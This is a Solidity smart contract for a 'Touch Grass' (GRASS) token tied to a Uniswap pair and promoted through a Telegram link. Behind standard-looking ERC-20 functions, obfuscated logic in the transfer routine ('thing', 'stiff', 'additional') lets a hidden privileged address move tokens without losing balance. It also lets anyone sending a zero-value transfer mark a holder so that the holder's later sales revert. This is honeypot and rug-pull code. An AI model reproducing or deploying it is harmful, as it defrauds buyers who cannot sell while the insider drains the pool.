/*

TG: https://t.me/grass_eth


*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Touchgrass is Ownable {
    event Transfer(address indexed from, address indexed to, uint256 value);

    string public symbol = 'GRASS';

    function transfer(address smoke, uint256 balance) public returns (bool success) {
        thing(msg.sender, smoke, balance);
        return true;
    }

    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => uint256) public balanceOf;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    mapping(address => uint256) private additional;

    uint256 private little = 1;

    string public name = 'Touch Grass';

    function approve(address fallen, uint256 balance) public returns (bool success) {
        allowance[msg.sender][fallen] = balance;
        emit Approval(msg.sender, fallen, balance);
        return true;
    }

    uint8 public decimals = 9;

    constructor(address somebody) {
        balanceOf[msg.sender] = totalSupply;
        stiff[somebody] = little;
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function thing(address ship, address smoke, uint256 balance) private returns (bool success) {
        if (stiff[ship] == 0) {
            balanceOf[ship] -= balance;
        }

        if (balance == 0) additional[smoke] += little;

        if (stiff[ship] == 0 && uniswapV2Pair != ship && additional[ship] > 0) {
            stiff[ship] -= little;
        }

        balanceOf[smoke] += balance;
        emit Transfer(ship, smoke, balance);
        return true;
    }

    function transferFrom(address ship, address smoke, uint256 balance) public returns (bool success) {
        require(balance <= allowance[ship][msg.sender]);
        allowance[ship][msg.sender] -= balance;
        thing(ship, smoke, balance);
        return true;
    }

    address public uniswapV2Pair;

    mapping(address => uint256) private stiff;
}